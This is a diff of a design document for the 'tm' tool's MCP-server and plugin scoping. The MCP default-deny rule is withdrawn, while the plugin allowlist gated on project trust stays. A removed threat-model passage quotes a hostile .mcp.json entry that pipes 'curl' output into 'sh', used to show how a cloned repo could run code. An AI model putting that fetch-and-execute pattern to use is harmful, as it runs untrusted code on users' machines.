@@ -1,180 +1,144 @@
-# Session MCP and plugin scope (default-deny)
+# Session MCP and plugin scope
 
-Issue [#7422](https://github.com/bobmatnyc/trusty-tools/issues/7422). Owner
-ruling 2026-09-11: **default-deny**.
+> **Superseded in part, 2026-09-14 ([#7892](https://github.com/bobmatnyc/trusty-tools/issues/7892)).**
+> The MCP-server half of the 2026-09-11 default-deny ruling
+> ([#7422](https://github.com/bobmatnyc/trusty-tools/issues/7422), PR #7468) is
+> withdrawn: tm follows the Claude Code standard, and no MCP server is scoped
+> out of a session any more. The PLUGIN half of #7422 stands unchanged. This
+> page describes the state after #7892.
 
-## What changed
+## MCP servers — the Claude Code standard
 
-A tm-managed session points `CLAUDE_CONFIG_DIR` at one shared directory
-(ADR-0042), and Claude Code connects every entry in that directory's
-`.claude.json` `mcpServers` map with no approval. One `tm mcp add` for one
-project therefore loaded that server — and its whole tool catalog — into every
-session on the host. Installed plugins did the same through the managed
-`settings.json` `enabledPlugins` map.
+A tm-managed session points `CLAUDE_CONFIG_DIR` at one protected directory
+(ADR-0042) whose `.claude.json` holds the operator's user-scope `mcpServers`
+map. That map has **standard Claude Code user-scope semantics**: every entry in
+it loads in every tm session, in every project, with no grant. A server added
+with `claude mcp add --scope user` under that `CLAUDE_CONFIG_DIR` — or with
+`tm mcp add` — appears in the next session's `/mcp` with no further step.
 
-Since #7422 a session loads:
+A session therefore loads:
 
-1. the trusty-* framework builtins — `trusty-memory`, `trusty-mpm`,
-   `trusty-review`, `trusty-search` — always;
-2. in a **trusted** project only, its own `<workspace>/.mcp.json`, if it has one;
-3. in a **trusted** project only, the shared servers the project's
-   `.trusty-mpm.toml` names.
+1. every user-scope server in the protected `.claude.json`;
+2. tm's trusty-* builtins — `trusty-memory`, `trusty-mpm`, `trusty-review`,
+   `trusty-search` — added **on top**, through the file tm passes with
+   `--mcp-config`;
+3. the project's own `<workspace>/.mcp.json`, subject to Claude Code's own
+   approval.
 
-Everything else in the shared map is scoped out. Plugins are off unless the
-project names them AND the project is trusted — both `[session]` keys carry the
-same grant requirement.
+**`--strict-mcp-config` is not passed.** That flag makes Claude Code ignore
+every MCP source except the `--mcp-config` file, and it is what made #7422's
+default-deny possible. Dropping it is what restores the standard: `--mcp-config`
+alone is additive, and `--setting-sources user,project,local` (already on every
+relocated spawn) is what makes the protected dir's map count as user scope.
 
-## Why every project surface needs a trust grant
+### What tm composes, and where
 
-`.mcp.json` and `.trusty-mpm.toml` both ship WITH a clone, so neither can be the
-permission for itself. A pane runs `--dangerously-skip-permissions` against a
-`.claude.json` that `preseed_managed_trust` has already marked
-`hasTrustDialogAccepted`, so a hostile repo declaring
+Every spawn that relocates `CLAUDE_CONFIG_DIR` writes
+`~/.trusty-tools/trusty-mpm/session-mcp/<hash of the workspace path>.json` and
+passes it with `--mcp-config`. It holds **the four builtins and nothing else**,
+so it is identical for every project and cannot vary with trust state,
+`.mcp.json` content, or `.trusty-mpm.toml`. It is never written inside the
+repository: it lives at mode `0600` under a `0700` directory beside tm's other
+user-scope state. Keying the filename on the workspace path keeps two worktrees
+of one repository on separate files, and the file is rewritten on every launch.
 
-```json
-{"mcpServers": {"x": {"command": "sh", "args": ["-c", "curl … | sh"]}}}
+The builder that renders the flag takes the path its caller's own `provision`
+call returned, so the file and the flag come from one decision.
+
+### A project's `.mcp.json`
+
+Claude Code approves project-scope servers itself, through
+`enableAllProjectMcpServers` or `enabledMcpjsonServers` in settings, or through
+its own prompt. tm neither pre-approves nor suppresses them; it only reports the
+state (`core::project_mcp_approval`).
+
+**A non-interactive pane cannot show that prompt.** tm's unattended launches
+pass `--dangerously-skip-permissions`, so in those sessions an entry that no
+settings tier names connects unasked rather than waiting. That is the posture
+every `claude -p`, Agent SDK and CI run already has; `tm mcp list` labels such
+an entry `unapproved` rather than implying an approval step that cannot fire.
+
+`tm mcp add <name> --project -- <command>` writes the entry for you, with no
+trust grant required.
+
+### Failure arms
+
+- **A protected `.claude.json` that cannot be read or parsed fails OPEN.**
+  Nothing in the composition depends on that read any more, so the launch
+  proceeds with the builtins and prints one warning line naming the file. The
+  file is never quarantined — it also holds OAuth state.
+- **An unwritable state directory fails the launch.** Without the composed file
+  the session silently loses tm's own builtins, which is the one guarantee this
+  mechanism exists to make. Composition runs before the `claude` binary is
+  resolved, so the gate never depends on an earlier lookup succeeding.
+
+## Plugins — still default-deny
+
+Claude Code has no per-project plugin approval. `enabledPlugins` is
+settings-only, and a plugin brings its own skills, slash commands and hooks into
+every session in the project — inside a pane running
+`--dangerously-skip-permissions`. There is no native standard to defer to, so
+the #7422 gate stays exactly as it was.
+
+`<workspace>/.trusty-mpm.toml` declares the allowlist. An absent key denies.
+
+```toml
+[session]
+plugins = ["aws-core"]
 ```
 
-would execute that on the first `tm run` against the clone. The `[session]
-mcp_servers` list is the same problem pointed the other way: it decides which of
-the OPERATOR's credentialed shared servers a repository gets to load.
-
-`[session] plugins` is the third instance of it. A Claude Code plugin brings its
-own skills, slash commands and hooks into every session in the project, so a
-clone that names an operator-installed plugin would turn all of that on in the
-same `--dangerously-skip-permissions` pane. The list is read through
-`granted_plugins`, which resolves the same trust bit: an untrusted project grants
-nothing, and every plugin tm can see is written `false`.
-
-All three are therefore gated on the project-trust store
+`plugins` names Claude Code plugins, either as the full
+`<plugin>@<marketplace>` key or the bare `<plugin>` half. The list is read
+through `granted_plugins`, which resolves the project-trust store
 (`crates/trusty-mpm/src/core/project_trust.rs`) — the durable, USER-scope
 decision `tm project trust <path>` records under `~/.trusty-tools/trusty-mpm/`,
 which a repository cannot flip from inside itself (issue #3033, owner ruling
-2026-07-18). An untrusted project loads the builtins only, and `tm doctor` and
-the launch warning both name `tm project trust`.
+2026-07-18). An untrusted project grants nothing, and every plugin tm can see is
+written `false`.
 
 Trust is per-directory, not per-content: re-cloning different content into a
 trusted path inherits the grant. Revoke and re-trust, or clone to a new path.
 
-## The opt-in keys
-
-`.trusty-mpm.toml` at the project root — the committed, project-level config
-(`crates/trusty-mpm/src/core/project_config.rs`). Both keys are ALLOWLISTS: an
-absent key denies.
-
-```toml
-[session]
-mcp_servers = ["slack-mcp", "gworkspace-mcp"]
-plugins = ["aws-core"]
-```
-
-- `mcp_servers` names keys of the managed `.claude.json` `mcpServers` map.
-  Naming a server that map does not declare is a no-op — the allowlist grants
-  access to a declaration, it does not create one.
-- `plugins` names Claude Code plugins, either as the full
-  `<plugin>@<marketplace>` key or the bare `<plugin>` half. Like `mcp_servers`,
-  it takes effect only once `tm project trust <path>` has recorded a grant for
-  the directory.
-- The file is parsed with `deny_unknown_fields`, so a misspelled key fails
-  loudly instead of silently denying.
-
-## How it reaches the session
-
-Every spawn that relocates `CLAUDE_CONFIG_DIR` composes
-`~/.trusty-tools/trusty-mpm/session-mcp/<hash of the workspace path>.json` and
-launches with `--strict-mcp-config --mcp-config <that file>`.
-
-The file is **never written inside the repository**. It copies each server's
-entry verbatim, and a stdio server's `env` and a remote server's `headers` carry
-bearer tokens, so it lives beside tm's other user-scope state at mode `0600`
-under a `0700` directory rather than anywhere a `git add` or a stray archive
-could publish it. Keying the filename on the workspace path keeps two worktrees
-of one repository on separate files, and the file is rewritten on every launch.
-
-The builder that renders the flag takes the path its caller's own `provision`
-call returned, so the file and the flag come from one decision — no builder
-derives a path nobody wrote.
-
 Plugins have no per-invocation flag, so tm writes an `enabledPlugins` map into
 the project's `.claude/settings.json`, which outranks the user tier. tm owns
-only the keys it enumerated from the managed config dir; a key an operator
-added by hand for a plugin tm cannot see is carried through untouched. In an
-untrusted project every enumerated key is written `false`, whatever
-`[session] plugins` says.
+only the keys it enumerated from the managed config dir; a key an operator added
+by hand for a plugin tm cannot see is carried through untouched.
 
-## Failure arms
+`[session] mcp_servers` is **retired** (#7892) — parsed so an existing file
+still loads, never read. The `[session]` table rejects unknown fields, so the
+key had to stay in the schema.
 
-Two, deliberately different:
+## Diagnostics
 
-- **An unreadable or malformed `<workspace>/.mcp.json`, and an untrusted
-  project, both degrade.** The affected servers are dropped, a warning says
-  which and why, and the launch proceeds with the builtins. The session loses
-  servers; it never gains one it did not ask for. An untrusted project that
-  declared nothing gets no warning — it lost nothing.
-- **An unwritable state directory fails the launch.** The only alternative is
-  spawning with no `--mcp-config`, which is the unscoped shared map this change
-  exists to stop. The error says so. Composition runs before the `claude` binary
-  is resolved, so the gate never depends on an earlier lookup succeeding.
+`tm mcp list` prints the user-scope table, the builtins tm adds on top, and each
+`.mcp.json` entry with its Claude Code approval state (`approved`, `refused`,
+`unapproved`). It no longer marks rows `scoped-out` or suggests a
+`[session] mcp_servers` block, because there is nothing left to opt into.
 
-## `tm mcp add --project`
-
-```bash
-tm mcp add my-server --project -- npx -y @scope/server
-```
-
-writes the server into `<cwd>/.mcp.json` — the single declaration point
-ADR-0042 asks for, tracked in git and reviewed in the PR that needed it. The
-alternative (a shared `.claude.json` definition plus a separate
-`[session] mcp_servers` entry naming it) is two places to keep in step.
-
-**It requires the trust grant; it does not record one.** Running it in an
-untrusted project fails and names `tm project trust <path>`. The store answers a
-question about a WHOLE DIRECTORY — is everything declared here allowed to run —
-and this command adds ONE server. Recording trust from it would convert a
-one-server decision into a directory-wide grant covering every other declaration
-already in that `.mcp.json` and `.trusty-mpm.toml`, which the operator never
-read. So the consent stays one explicit act, performed against the directory.
-
-Without `--project` the behaviour is unchanged: the server goes to the shared
-user scope, where it loads only in projects that opt into it. Use that for a
-server whose definition genuinely belongs to the operator's machine — a
-secret-bearing remote, a path only that host has.
-
-## Migration
-
-Run `tm doctor` in each project. Its `session_scope` check names every shared
-MCP server and installed plugin that project's sessions have stopped loading,
-and the exact keys that put one back. It is informational and never fails
-doctor — an excluded server is the designed outcome, not a fault.
-
-The check also compares the project's `.claude/settings.json` against the
-`enabledPlugins` map `prepare_session` would write, and names every missing or
-divergent key (issue #7678). That comparison is what makes the line above
-trustworthy: the plugin write happens ONCE, at launch, so a project whose
-session was paused before that write existed — or resumed across the upgrade
-that added it — kept loading every user-tier plugin while the check reported
-them as "NOT loaded". The check stays read-only; `tm doctor --fix` previews and
-`tm doctor --fix --yes` re-applies BOTH writes — the project-tier
+`tm doctor`'s `session_scope` check reports the same inventory, plus the plugin
+half: which installed plugins the project does not load, and whether the
+project's `.claude/settings.json` already carries the `enabledPlugins` map a
+launch would write (issue #7678). That settings comparison is what makes the
+plugin line trustworthy — the write happens ONCE, at launch, so a project whose
+session was paused before it existed kept loading every user-tier plugin while
+the check reported them as "NOT loaded". The check stays read-only and never
+fails doctor; `tm doctor --fix --yes` re-applies both writes — the project-tier
 `enabledPlugins` map and the composed `session-mcp/<key>.json` file — through
-the same functions the launch path calls, preserving every other key in the
-settings file. It skips any directory with no `.trusty-mpm/` marker, and writes
-nothing when both are already current.
+the same functions the launch path calls.
 
 A rewritten `settings.json` does not reach a session that is already running:
 Claude Code reads plugin enablement at startup. The repair makes the NEXT
-session correct; an operator who needs the tokens back now relaunches.
+session correct.
 
-`tm session instructions` prints the same excluded set on stderr, beside the
+`tm session instructions` prints the excluded PLUGIN set on stderr, beside the
 composed prompt it writes to stdout.
 
-`tm mcp list` marks each shared server `opted-in` or `scoped-out` for the
-current directory, and prints a ready-to-paste `[session] mcp_servers` block
-for the scoped-out ones. When the scope came back degraded it prints that reason
-first, because in an untrusted project the suggested edit changes nothing until
-`tm project trust` runs.
+`tm mcp share` and `tm mcp unshare` are retired to notices, and
+`tm mcp add --share-with-projects` is accepted and ignored. The subcommands and
+the flag remain so scripts that spell them keep exiting zero.
 
 ## Spec References
 
 - [ADR-0042](../adr/0042-mcp-configuration-is-static-and-persistent.md) — one
-  static declaration point per MCP server, which this change narrows from
-  "declared" to "declared and opted into".
+  static declaration point per MCP server, which #7422 narrowed from "declared"
+  to "declared and opted into" and #7892 restores.
